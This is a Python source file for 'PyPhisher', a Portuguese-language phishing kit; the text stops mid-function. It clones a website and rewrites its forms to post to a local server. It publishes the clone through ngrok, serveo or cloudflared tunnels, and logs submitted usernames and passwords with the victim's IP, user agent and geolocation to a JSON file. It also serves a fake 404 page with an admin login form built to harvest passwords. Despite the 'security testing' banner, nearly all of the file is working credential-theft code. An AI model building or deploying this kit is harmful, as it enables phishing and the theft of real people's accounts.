#!/usr/bin/env python3
import os
import sys
import requests
from bs4 import BeautifulSoup
import socket
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
import socketserver
import re
import time
from datetime import datetime
import json
import random
import subprocess
from urllib.parse import urlparse, urljoin
import mimetypes
import shutil
from concurrent.futures import ThreadPoolExecutor
import hashlib
import zipfile
import tempfile
import ssl
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
import ipaddress
import geoip2.database
import platform
import getpass
import webbrowser

# Configurações globais
VERSION = "3.0"
CONFIG_FILE = "pyphisher_config.json"
MAX_THREADS = 5
GEOIP_DATABASE = "GeoLite2-City.mmdb"
TUNNEL_DIR = "tunnel_tools"

# Cores e estilos avançados
class colors:
    palette = {
        'dark': {
            'RED': '\033[38;5;196m',
            'GREEN': '\033[38;5;46m',
            'YELLOW': '\033[38;5;226m',
            'BLUE': '\033[38;5;39m',
            'PURPLE': '\033[38;5;129m',
            'CYAN': '\033[38;5;51m',
            'WHITE': '\033[38;5;255m',
            'GRAY': '\033[38;5;240m',
            'BG': '\033[48;5;232m'
        },
        'light': {
            'RED': '\033[38;5;124m',
            'GREEN': '\033[38;5;28m',
            'YELLOW': '\033[38;5;130m',
            'BLUE': '\033[38;5;26m',
            'PURPLE': '\033[38;5;90m',
            'CYAN': '\033[38;5;30m',
            'WHITE': '\033[38;5;16m',
            'GRAY': '\033[38;5;242m',
            'BG': '\033[48;5;15m'
        }
    }
    
    def __init__(self, theme='dark'):
        self.set_theme(theme)
        
    def set_theme(self, theme):
        theme = theme.lower()
        if theme not in ['dark', 'light']:
            theme = 'dark'
            
        for name, code in self.palette[theme].items():
            setattr(self, name, code)
            
        # Códigos comuns
        self.END = '\033[0m'
        self.BOLD = '\033[1m'
        self.UNDERLINE = '\033[4m'
        self.BLINK = '\033[5m'
        
# Inicializar cores
ui = colors('dark')

# Banner animado
def animated_banner():
    frames = [
        f"""{ui.PURPLE}
  ____  _     _     _       _     _____ _     _     _____ _____ ____  
 |  _ \| |__ (_)___| |__   (_)___|  ___| |__ (_)___|  ___| ____/ ___| 
 | |_) | '_ \| / __| '_ \  | / __| |_  | '_ \| / __| |_  |  _| \___ \ 
 |  __/| | | | \__ \ | | | | \__ \  _| | | | | \__ \  _| | |___ ___) |
 |_|   |_| |_|_|___/_| |_| |_|___/_|   |_| |_|_|___/_|   |_____|____/ 
{ui.CYAN}
 ██████╗ ██████╗  ██████╗      ██╗███████╗██╗  ██╗███████╗██████╗ 
██╔═══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██║  ██║██╔════╝██╔══██╗
██║   ██║██████╔╝██║   ██║     ██║███████╗███████║█████╗  ██████╔╝
██║   ██║██╔═══╝ ██║   ██║██   ██║╚════██║██╔══██║██╔══╝  ██╔══██╗
╚██████╔╝██║     ╚██████╔╝╚█████╔╝███████║██║  ██║███████╗██║  ██║
 ╚═════╝ ╚═╝      ╚═════╝  ╚════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{ui.YELLOW}
>> Ferramenta Avançada de Clonagem para Testes de Segurança <<
{ui.END}""",
        f"""{ui.BLUE}
  ____  _     _     _       _     _____ _     _     _____ _____ ____  
 |  _ \| |__ (_)___| |__   (_)___|  ___| |__ (_)___|  ___| ____/ ___| 
 | |_) | '_ \| / __| '_ \  | / __| |_  | '_ \| / __| |_  |  _| \___ \ 
 |  __/| | | | \__ \ | | | | \__ \  _| | | | | \__ \  _| | |___ ___) |
 |_|   |_| |_|_|___/_| |_| |_|___/_|   |_| |_|_|___/_|   |_____|____/ 
{ui.PURPLE}
 ██████╗ ██████╗  ██████╗      ██╗███████╗██╗  ██╗███████╗██████╗ 
██╔═══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██║  ██║██╔════╝██╔══██╗
██║   ██║██████╔╝██║   ██║     ██║███████╗███████║█████╗  ██████╔╝
██║   ██║██╔═══╝ ██║   ██║██   ██║╚════██║██╔══██║██╔══╝  ██╔══██╗
╚██████╔╝██║     ╚██████╔╝╚█████╔╝███████║██║  ██║███████╗██║  ██║
 ╚═════╝ ╚═╝      ╚═════╝  ╚════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{ui.CYAN}
>> Versão {VERSION} - Com Sistema de Tunelamento Avançado <<
{ui.END}"""
    ]
    
    for frame in frames:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(frame)
        time.sleep(0.3)

# Sistema de configuração
class ConfigManager:
    def __init__(self):
        self.config = {
            'theme': 'dark',
            'last_used_port': 8080,
            'user_agents': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36'
            ],
            'clone_depth': 2,
            'max_threads': MAX_THREADS,
            'auto_https': True,
            'stealth_mode': False,
            'proxy': None,
            'tunnel_service': 'ngrok',
            'tunnel_region': 'us'
        }
        
    def load(self):
        try:
            with open(CONFIG_FILE, 'r') as f:
                loaded_config = json.load(f)
                self.config.update(loaded_config)
        except (FileNotFoundError, json.JSONDecodeError):
            self.save()
            
    def save(self):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=4)
            
    def get(self, key, default=None):
        return self.config.get(key, default)
    
    def set(self, key, value):
        self.config[key] = value
        self.save()

# Inicializar configuração
config = ConfigManager()
config.load()
ui.set_theme(config.get('theme'))

# Utilitários avançados
class Utils:
    @staticmethod
    def progress_bar(iteration, total, prefix='', suffix='', length=50, fill='█'):
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
        if iteration == total: 
            print()
    
    @staticmethod
    def random_user_agent():
        return random.choice(config.get('user_agents'))
    
    @staticmethod
    def get_external_ip():
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "127.0.0.1"
    
    @staticmethod
    def generate_self_signed_cert(cert_file="cert.pem", key_file="key.pem"):
        # Gerar chave privada
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        # Criar certificado auto-assinado
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Python HTTP Server"),
            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost")]),
            critical=False,
        ).sign(key, hashes.SHA256(), default_backend())
        
        # Escrever certificado e chave
        with open(cert_file, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
            
        with open(key_file, "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))
            
        return cert_file, key_file
    
    @staticmethod
    def get_geolocation(ip):
        if not os.path.exists(GEOIP_DATABASE):
            return {"error": "Database not found"}
            
        try:
            with geoip2.database.Reader(GEOIP_DATABASE) as reader:
                response = reader.city(ip)
                return {
                    "country": response.country.name,
                    "city": response.city.name,
                    "postal": response.postal.code,
                    "location": f"{response.location.latitude}, {response.location.longitude}"
                }
        except:
            return {"error": "Geolocation failed"}
    
    @staticmethod
    def download_file(url, filename):
        try:
            with requests.get(url, stream=True) as r:
                r.raise_for_status()
                with open(filename, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
            return True
        except Exception as e:
            print(f"{ui.RED}[-] Erro ao baixar arquivo: {str(e)}{ui.END}")
            return False

# Gerenciador de Tunelamento
class TunnelManager:
    def __init__(self):
        self.tunnel_process = None
        self.tunnel_url = None
        self.supported_services = {
            'ngrok': {
                'name': 'Ngrok',
                'url': 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip',
                'executable': 'ngrok',
                'regions': ['us', 'eu', 'ap', 'au', 'sa', 'jp', 'in']
            },
            'serveo': {
                'name': 'Serveo',
                'url': None,
                'executable': 'ssh',
                'regions': None
            },
            'localtunnel': {
                'name': 'LocalTunnel',
                'url': None,
                'executable': 'lt',
                'regions': None
            },
            'cloudflared': {
                'name': 'Cloudflared',
                'url': 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64',
                'executable': 'cloudflared',
                'regions': None
            },
            'pagekite': {
                'name': 'PageKite',
                'url': 'https://pagekite.net/pk/pagekite.py',
                'executable': 'pagekite.py',
                'regions': None
            }
        }
        
        # Criar diretório para ferramentas de tunelamento
        if not os.path.exists(TUNNEL_DIR):
            os.makedirs(TUNNEL_DIR)
    
    def install_tunnel_service(self, service):
        if service not in self.supported_services:
            print(f"{ui.RED}[-] Serviço não suportado: {service}{ui.END}")
            return False
            
        service_info = self.supported_services[service]
        
        # Verificar se já está instalado
        if self.check_installed(service):
            print(f"{ui.GREEN}[+] {service_info['name']} já está instalado{ui.END}")
            return True
            
        print(f"{ui.YELLOW}[*] Instalando {service_info['name']}...{ui.END}")
        
        try:
            if service == 'ngrok':
                zip_path = os.path.join(TUNNEL_DIR, 'ngrok.zip')
                if Utils.download_file(service_info['url'], zip_path):
                    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                        zip_ref.extractall(TUNNEL_DIR)
                    os.chmod(os.path.join(TUNNEL_DIR, 'ngrok'), 0o755)
                    os.remove(zip_path)
                    print(f"{ui.GREEN}[+] Ngrok instalado com sucesso{ui.END}")
                    return True
                    
            elif service == 'cloudflared':
                file_path = os.path.join(TUNNEL_DIR, 'cloudflared')
                if Utils.download_file(service_info['url'], file_path):
                    os.chmod(file_path, 0o755)
                    print(f"{ui.GREEN}[+] Cloudflared instalado com sucesso{ui.END}")
                    return True
                    
            elif service == 'pagekite':
                file_path = os.path.join(TUNNEL_DIR, 'pagekite.py')
                if Utils.download_file(service_info['url'], file_path):
                    print(f"{ui.GREEN}[+] PageKite instalado com sucesso{ui.END}")
                    return True
                    
            elif service == 'localtunnel':
                result = subprocess.run(['npm', 'install', '-g', 'localtunnel'], capture_output=True, text=True)
                if result.returncode == 0:
                    print(f"{ui.GREEN}[+] LocalTunnel instalado com sucesso{ui.END}")
                    return True
                else:
                    print(f"{ui.RED}[-] Erro ao instalar LocalTunnel: {result.stderr}{ui.END}")
                    return False
                    
            elif service == 'serveo':
                print(f"{ui.GREEN}[+] Serveo não requer instalação (usa SSH nativo){ui.END}")
                return True
                
        except Exception as e:
            print(f"{ui.RED}[-] Erro na instalação: {str(e)}{ui.END}")
            return False
    
    def check_installed(self, service):
        if service not in self.supported_services:
            return False
            
        service_info = self.supported_services[service]
        
        if service in ['ngrok', 'cloudflared', 'pagekite']:
            return os.path.exists(os.path.join(TUNNEL_DIR, service_info['executable']))
        elif service == 'localtunnel':
            try:
                subprocess.run(['lt', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            except:
                return False
        elif service == 'serveo':
            try:
                subprocess.run(['ssh', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            except:
                return False
        return False
    
    def start_tunnel(self, port, service=None, region=None):
        if service is None:
            service = config.get('tunnel_service', 'ngrok')
            
        if region is None:
            region = config.get('tunnel_region', 'us')
            
        if not self.check_installed(service):
            print(f"{ui.RED}[-] {self.supported_services[service]['name']} não está instalado{ui.END}")
            if input(f"{ui.YELLOW}[?] Deseja instalar agora? (s/n): {ui.END}").lower() == 's':
                if not self.install_tunnel_service(service):
                    return None
            else:
                return None
        
        print(f"{ui.YELLOW}[*] Iniciando tunelamento com {self.supported_services[service]['name']}...{ui.END}")
        
        try:
            if service == 'ngrok':
                cmd = [
                    os.path.join(TUNNEL_DIR, 'ngrok'),
                    'http',
                    '--region=' + region,
                    str(port)
                ]
                self.tunnel_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(3)  # Esperar ngrok iniciar
                
                # Tentar obter URL da API do ngrok
                try:
                    resp = requests.get('http://localhost:4040/api/tunnels')
                    data = resp.json()
                    self.tunnel_url = data['tunnels'][0]['public_url']
                    print(f"{ui.GREEN}[+] Ngrok iniciado: {self.tunnel_url}{ui.END}")
                    return self.tunnel_url
                except:
                    print(f"{ui.RED}[-] Não foi possível obter URL do Ngrok{ui.END}")
                    return None
                    
            elif service == 'serveo':
                cmd = [
                    'ssh',
                    '-o', 'StrictHostKeyChecking=no',
                    '-o', 'ServerAliveInterval=60',
                    '-R', '80:localhost:' + str(port),
                    'serveo.net'
                ]
                self.tunnel_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(2)
                
                # Serveo mostra a URL no output
                for line in iter(self.tunnel_process.stdout.readline, b''):
                    line = line.decode().strip()
                    if 'serveo.net' in line:
                        self.tunnel_url = 'https://' + line.split(' ')[-1]
                        print(f"{ui.GREEN}[+] Serveo iniciado: {self.tunnel_url}{ui.END}")
                        return self.tunnel_url
                return None
                
            elif service == 'localtunnel':
                cmd = ['lt', '--port', str(port)]
                self.tunnel_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(2)
                
                # LocalTunnel mostra a URL no output
                for line in iter(self.tunnel_process.stdout.readline, b''):
                    line = line.decode().strip()
                    if 'your url is:' in line.lower():
                        self.tunnel_url = line.split(' ')[-1]
                        print(f"{ui.GREEN}[+] LocalTunnel iniciado: {self.tunnel_url}{ui.END}")
                        return self.tunnel_url
                return None
                
            elif service == 'cloudflared':
                cmd = [
                    os.path.join(TUNNEL_DIR, 'cloudflared'),
                    'tunnel',
                    '--url', 'http://localhost:' + str(port)
                ]
                self.tunnel_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(3)
                
                # Cloudflared mostra a URL no output
                for line in iter(self.tunnel_process.stderr.readline, b''):
                    line = line.decode().strip()
                    if '.trycloudflare.com' in line:
                        self.tunnel_url = 'https://' + line.split(' ')[-1]
                        print(f"{ui.GREEN}[+] Cloudflared iniciado: {self.tunnel_url}{ui.END}")
                        return self.tunnel_url
                return None
                
            elif service == 'pagekite':
                # PageKite requer configuração adicional
                kite_name = input(f"{ui.YELLOW}[?] Digite o nome do subdomínio desejado (ex: meusite): {ui.END}")
                cmd = [
                    'python3',
                    os.path.join(TUNNEL_DIR, 'pagekite.py'),
                    str(port),
                    f"{kite_name}.pagekite.me"
                ]
                self.tunnel_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(3)
                self.tunnel_url = f"https://{kite_name}.pagekite.me"
                print(f"{ui.GREEN}[+] PageKite iniciado: {self.tunnel_url}{ui.END}")
                return self.tunnel_url
                
        except Exception as e:
            print(f"{ui.RED}[-] Erro ao iniciar tunelamento: {str(e)}{ui.END}")
            return None
    
    def stop_tunnel(self):
        if self.tunnel_process:
            try:
                self.tunnel_process.terminate()
                self.tunnel_process.wait(timeout=3)
                print(f"{ui.GREEN}[+] Tunelamento encerrado{ui.END}")
            except:
                try:
                    self.tunnel_process.kill()
                except:
                    pass
            self.tunnel_process = None
            self.tunnel_url = None

# Clonagem profunda de sites
class SiteCloner:
    def __init__(self, url, output_dir="cloned_site", depth=1):
        self.base_url = url
        self.output_dir = output_dir
        self.max_depth = min(depth, config.get('clone_depth', 2))
        self.visited_urls = set()
        self.resource_map = {}
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': Utils.random_user_agent()})
        
    def normalize_url(self, url):
        if url.startswith('//'):
            return 'https:' + url
        return url
        
    def get_full_url(self, url):
        return urljoin(self.base_url, url)
        
    def is_same_domain(self, url):
        base_domain = urlparse(self.base_url).netloc
        other_domain = urlparse(url).netloc
        return not other_domain or other_domain == base_domain
        
    def should_download(self, url):
        if not url or url.startswith(('mailto:', 'tel:', 'javascript:', 'data:')):
            return False
            
        url = self.normalize_url(url)
        if url in self.visited_urls:
            return False
            
        if not self.is_same_domain(url):
            return False
            
        return True
        
    def download_resource(self, url, depth=0):
        if not self.should_download(url):
            return None
            
        url = self.normalize_url(url)
        self.visited_urls.add(url)
        
        try:
            response = self.session.get(url, timeout=10)
            response.raise_for_status()
            
            content_type = response.headers.get('content-type', '').split(';')[0]
            return {
                'url': url,
                'content': response.content,
                'content_type': content_type,
                'extension': mimetypes.guess_extension(content_type) or '.bin'
            }
        except Exception as e:
            print(f"{ui.RED}[-] Erro ao baixar {url}: {str(e)}{ui.END}")
            return None
            
    def save_resource(self, resource, filepath):
        try:
            with open(filepath, 'wb') as f:
                f.write(resource['content'])
            return True
        except Exception as e:
            print(f"{ui.RED}[-] Erro ao salvar {filepath}: {str(e)}{ui.END}")
            return False
            
    def process_html(self, html, base_path):
        soup = BeautifulSoup(html, 'html.parser')
        
        # Modificar formulários
        for form in soup.find_all('form'):
            form['action'] = "/submit"
            form['method'] = "POST"
            
            # Adicionar campos ocultos para fingerprinting
            hidden1 = soup.new_tag("input", type="hidden", name="timestamp", value=str(int(time.time())))
            hidden2 = soup.new_tag("input", type="hidden", name="referrer", value=self.base_url)
            form.append(hidden1)
            form.append(hidden2)
        
        # Modificar links e recursos
        for tag in soup.find_all(['a', 'link', 'script', 'img', 'source']):
            if tag.name == 'a' and tag.get('href'):
                if not tag['href'].startswith(('http://', 'https://', 'mailto:', 'tel:', '#')):
                    tag['href'] = "#"
            elif tag.get('href'):
                if self.should_download(tag['href']):
                    resource = self.download_resource(tag['href'])
                    if resource:
                        filename = f"res_{len(self.resource_map)}{resource['extension']}"
                        filepath = os.path.join(base_path, filename)
                        if self.save_resource(resource, filepath):
                            tag['href'] = filename
                            self.resource_map[tag['href']] = resource['url']
            elif tag.get('src'):
                if self.should_download(tag['src']):
                    resource = self.download_resource(tag['src'])
                    if resource:
                        filename = f"res_{len(self.resource_map)}{resource['extension']}"
                        filepath = os.path.join(base_path, filename)
                        if self.save_resource(resource, filepath):
                            tag['src'] = filename
                            self.resource_map[tag['src']] = resource['url']
        
        return str(soup)
        
    def clone_site(self):
        start_time = time.time()
        
        # Criar diretório principal
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            print(f"{ui.GREEN}[+] Diretório '{self.output_dir}' criado.{ui.END}")
        
        # Criar subdiretório para recursos
        resources_dir = os.path.join(self.output_dir, "resources")
        if not os.path.exists(resources_dir):
            os.makedirs(resources_dir)
        
        # Baixar página principal
        print(f"{ui.YELLOW}[*] Baixando página principal...{ui.END}")
        main_page = self.download_resource(self.base_url)
        
        if not main_page:
            print(f"{ui.RED}[-] Falha ao baixar página principal{ui.END}")
            return False
            
        # Processar HTML principal
        print(f"{ui.YELLOW}[*] Processando HTML...{ui.END}")
        processed_html = self.process_html(main_page['content'], resources_dir)
        
        # Salvar HTML principal
        index_path = os.path.join(self.output_dir, "index.html")
        with open(index_path, 'w', encoding='utf-8') as f:
            f.write(processed_html)
        
        print(f"{ui.GREEN}[+] Site clonado com sucesso em '{index_path}'{ui.END}")
        print(f"{ui.CYAN}[*] Tempo total: {time.time() - start_time:.2f} segundos{ui.END}")
        print(f"{ui.CYAN}[*] Total de recursos baixados: {len(self.resource_map)}{ui.END}")
        
        return True

# Servidor HTTP avançado
class AdvancedPhishingServer:
    def __init__(self, port=8080, https=False, stealth=False):
        self.port = port
        self.use_https = https
        self.stealth_mode = stealth
        self.credentials_file = "credenciais_capturadas.json"
        self.stats = {
            'total_requests': 0,
            'credentials_captured': 0,
            'unique_ips': set(),
            'start_time': datetime.now()
        }
        self.tunnel_manager = TunnelManager()
        self.tunnel_url = None
        
    def get_server_stats(self):
        return {
            'uptime': str(datetime.now() - self.stats['start_time']),
            'total_requests': self.stats['total_requests'],
            'credentials_captured': self.stats['credentials_captured'],
            'unique_visitors': len(self.stats['unique_ips']),
            'last_activity': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'tunnel_url': self.tunnel_url
        }
        
    def generate_error_page(self, code=404):
        error_pages = {
            404: f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Página Não Encontrada</title>
                <style>
                    body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
                    h1 {{ color: #d9534f; }}
                    .login-box {{ 
                        margin: 30px auto; 
                        padding: 20px; 
                        width: 300px; 
                        border: 1px solid #ddd; 
                        border-radius: 5px;
                        background: #f9f9f9;
                    }}
                </style>
            </head>
            <body>
                <h1>Erro 404 - Página Não Encontrada</h1>
                <p>A página que você está procurando não existe ou foi movida.</p>
                
                <div class="login-box">
                    <h3>Área de Administração</h3>
                    <form action="/submit" method="POST">
                        <input type="hidden" name="error_page" value="404">
                        <p><input type="text" name="username" placeholder="Usuário"></p>
                        <p><input type="password" name="password" placeholder="Senha"></p>
                        <p><button type="submit">Acessar</button></p>
                    </form>
                </div>
            </body>
            </html>
            """
        }
        return error_pages.get(code, "<h1>Erro Desconhecido</h1>")
        
    def run(self):
        handler = self.create_handler()
        
        if self.use_https:
            cert_file, key_file = Utils.generate_self_signed_cert()
            httpd = socketserver.TCPServer(("", self.port), handler)
            httpd.socket = ssl.wrap_socket(
                httpd.socket,
                certfile=cert_file,
                keyfile=key_file,
                server_side=True
            )
            print(f"{ui.GREEN}[+] Servidor HTTPS iniciado na porta {self.port}{ui.END}")
        else:
            httpd = socketserver.TCPServer(("", self.port), handler)
            print(f"{ui.GREEN}[+] Servidor HTTP iniciado na porta {self.port}{ui.END}")
            
        print(f"{ui.CYAN}[*] Acesse em: {'https' if self.use_https else 'http'}://localhost:{self.port}{ui.END}")
        
        # Iniciar tunelamento em uma thread separada
        tunnel_thread = threading.Thread(target=self.start_tunnel)
        tunnel_thread.daemon = True
        tunnel_thread.start()
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{ui.YELLOW}[*] Parando servidor...{ui.END}")
            self.tunnel_manager.stop_tunnel()
            httpd.shutdown()
            httpd.server_close()
        
    def start_tunnel(self):
        if config.get('stealth_mode', False):
            print(f"{ui.YELLOW}[*] Modo furtivo ativado - Tunelamento desabilitado{ui.END}")
            return
            
        service = config.get('tunnel_service', 'ngrok')
        region = config.get('tunnel_region', 'us')
        
        self.tunnel_url = self.tunnel_manager.start_tunnel(self.port, service, region)
        if self.tunnel_url:
            print(f"{ui.GREEN}[+] URL do tunelamento: {self.tunnel_url}{ui.END}")
            print(f"{ui.CYAN}[*] Pressione Ctrl+C para parar o servidor e o tunelamento{ui.END}")
            
            # Abrir no navegador padrão
            if input(f"{ui.YELLOW}[?] Abrir no navegador? (s/n): {ui.END}").lower() == 's':
                webbrowser.open(self.tunnel_url)
        
    def create_handler(self):
        class CustomHandler(SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory="cloned_site", **kwargs)
                self.server_instance = self
            
            def do_GET(self):
                self.server_instance.stats['total_requests'] += 1
                client_ip = self.client_address[0]
                self.server_instance.stats['unique_ips'].add(client_ip)
                
                try:
                    if self.path == '/stats':
                        self.send_stats()
                    else:
                        super().do_GET()
                except FileNotFoundError:
                    self.send_error_page(404)
                except Exception as e:
                    print(f"{ui.RED}[-] Erro no GET: {str(e)}{ui.END}")
                    self.send_error(500)
            
            def do_POST(self):
                self.server_instance.stats['total_requests'] += 1
                client_ip = self.client_address[0]
                self.server_instance.stats['unique_ips'].add(client_ip)
                
                if self.path == '/submit':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    
                    # Parse dos dados do formulário
                    form_data = {}
                    for item in post_data.split('&'):
                        key, value = item.split('=', 1)
                        form_data[key] = requests.utils.unquote(value)
                    
                    # Adicionar metadados
                    form_data['ip'] = client_ip
                    form_data['timestamp'] = datetime.now().isoformat()
                    form_data['user_agent'] = self.headers.get('User-Agent', '')
                    
                    # Geolocalização
                    geo = Utils.get_geolocation(client_ip)
                    if 'error' not in geo:
                        form_data['geolocation'] = geo
                    
                    # Salvar credenciais
                    self.save_credentials(form_data)
                    
                    # Redirecionar
                    self.send_response(302)
                    self.send_header('Location', '/')
                    self.end_headers()
                else:
                    self.send_error(404)
            
            def send_stats(self):
                stats = self.server_instance.get_server_stats()
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(stats, indent=4).encode('utf-8'))
            
            def send_error_page(self, code):
                self.send_response(code)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(self.server_instance.generate_error_page(code).encode('utf-8'))
            
            def save_credentials(self, data):
                self.server_instance.stats['credentials_captured'] += 1
                
                try:
                    # Carregar existentes
                    existing = []
                    if os.path.exists(self.server_instance.credentials_file):
                        with open(self.server_instance.credentials_file, 'r') as f:
                            existing = json.load(f)
                    
                    # Adicionar novos
                    existing.append(data)
                    
                    # Salvar
                    with open(self.server_instance.credentials_file, 'w') as f:
                        json.dump(existing, f, indent=4)
                    
                    print(f"\n{ui.RED}[!] Credenciais capturadas:{ui.END}")
                    for k, v in data.items():
                        if k not in ['timestamp', 'geolocation']:
                            print(f"{ui.YELLOW}{k}: {v}{ui.END}")
                    
                    print(f"{ui.CYAN}[*] Total capturado: {self.server_instance.stats['credentials_captured']}{ui.END}")
                except Exception as e:
                    print(f"{ui.RED}[-] Erro ao salvar credenciais: {str(e)}{ui.END}")
        
        return CustomHandler

# Sistema de menus
class MenuSystem:
    def __init__(self):
        self.current_menu = "main"
        self.history = []
        self.tunnel_manager = TunnelManager()
        
    def display_menu(self, menu_name):
        self.current_menu = menu_name
        self.history.append(menu_name)
        
        if menu_name == "main":
            self.main_menu()
        elif menu_name == "clone":
            self.clone_menu()
        elif menu_name == "server":
            self.server_menu()
        elif menu_name == "settings":
            self.settings_menu()
        elif menu_name == "stats":
            self.stats_menu()
        elif menu_name == "tunnel":
            self.tunnel_menu()
        else:
            self.main_menu()
            
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        animated_banner()
        
    def main_menu(self):
        self.clear_screen()
        print(f"""{ui.PURPLE}
╔══════════════════════════════════════════════════════════╗
║{ui.CYAN}               MENU PRINCIPAL - PYPHISHER              {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}1. {ui.GREEN}Clonar Site                                  {ui.PURPLE}║
║ {ui.WHITE}2. {ui.GREEN}Gerenciar Servidor Phishing                {ui.PURPLE}║
║ {ui.WHITE}3. {ui.GREEN}Gerenciar Tunelamento                      {ui.PURPLE}║
║ {ui.WHITE}4. {ui.GREEN}Configurações                               {ui.PURPLE}║
║ {ui.WHITE}5. {ui.GREEN}Estatísticas                                {ui.PURPLE}║
║ {ui.WHITE}6. {ui.RED}Sair                                          {ui.PURPLE}║
╚══════════════════════════════════════════════════════════╝{ui.END}""")

        choice = input(f"\n{ui.YELLOW}[?] Selecione uma opção (1-6): {ui.END}")
        
        if choice == '1':
            self.display_menu("clone")
        elif choice == '2':
            self.display_menu("server")
        elif choice == '3':
            self.display_menu("tunnel")
        elif choice == '4':
            self.display_menu("settings")
        elif choice == '5':
            self.display_menu("stats")
        elif choice == '6':
            print(f"\n{ui.RED}[!] Saindo...{ui.END}")
            sys.exit()
        else:
            print(f"\n{ui.RED}[-] Opção inválida!{ui.END}")
            time.sleep(1)
            self.display_menu("main")
            
    def tunnel_menu(self):
        self.clear_screen()
        current_service = config.get('tunnel_service', 'ngrok')
        current_region = config.get('tunnel_region', 'us')
        
        print(f"""{ui.PURPLE}
╔══════════════════════════════════════════════════════════╗
║{ui.CYAN}               GERENCIAMENTO DE TUNELAMENTO         {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}Serviço Atual: {ui.GREEN}{current_service.upper()} ({current_region.upper() if current_region else 'N/A'})           {ui.PURPLE}║
╠══════════════════════════════════════════════════════════╣
║ {ui.WHITE}1. {ui.GREEN}Selecionar Serviço de Tunelamento           {ui.PURPLE}║
║ {ui.WHITE}2. {ui.GREEN}Configurar Região (Ngrok)                   {ui.PURPLE}║
║ {ui.WHITE}3. {ui.GREEN}Instalar/Atualizar Ferramentas              {ui.PURPLE}║
║ {ui.WHITE}4. {ui.GREEN}Testar Tunelamento                          {ui.PURPLE}║
║ {ui.WHITE}5. {ui.BLUE}Voltar ao Menu Principal                     {ui.PURPLE}║
╚══════════════════════════════════════════════════════════╝{ui.END}""")

        choice = input(f"\n{ui.YELLOW}[?] Selecione uma opção (1-5): {ui.END}")
        
        if choice == '1':
            self.select_tunnel_service()
        elif choice == '2':
            self.configure_tunnel_region()
        elif choice == '3':
            self.install_tunnel_tools()
        elif choice == '4':
            self.test_tunnel()
        elif choice == '5':
            self.display_menu("main")
        else:
            print(f"\n{ui.RED}[-] Opção inválida!{ui.END}")
            time.sleep(1)
            self.display_menu("tunnel")
            
    def select_tunnel_service(self):
        self.clear_screen()
